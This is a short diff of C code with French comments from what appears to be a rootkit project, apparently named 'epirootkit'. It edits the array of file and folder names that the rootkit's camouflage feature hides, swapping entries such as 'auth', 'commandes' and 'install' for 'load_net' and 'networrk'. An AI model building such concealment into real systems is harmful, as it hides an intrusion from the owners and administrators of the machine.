@@ -25,16 +25,9 @@ struct systeme_camouflage {
 static struct systeme_camouflage camouflage = {0};
 
 static const char *elements_a_dissimuler[] = {
-    "fichiercache",
-    "auth",
-    "Makefile",
-    "commandes",
-    "dissimulation", 
-    "encodage.sh",
-    "epirootkit", 
-    "notification",
-    "main",
-    "install",
+    "fichiercache", //fichier quiui sera masquer 
+    "load_net", //dossier qui sera masquer
+    "networrk", // dossier qui sera masquer
     NULL
 };
 
